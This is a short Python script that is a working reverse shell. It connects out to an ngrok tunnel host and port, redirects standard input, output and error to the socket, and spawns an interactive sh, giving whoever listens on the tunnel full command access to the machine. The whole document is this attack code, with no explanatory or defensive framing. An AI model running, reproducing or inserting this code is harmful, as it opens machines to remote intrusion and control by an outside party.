import socket
import os
import pty

RHOST = "0.tcp.ap.ngrok.io"
RPORT = 17286

s = socket.socket()
s.connect((RHOST, RPORT))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("sh")
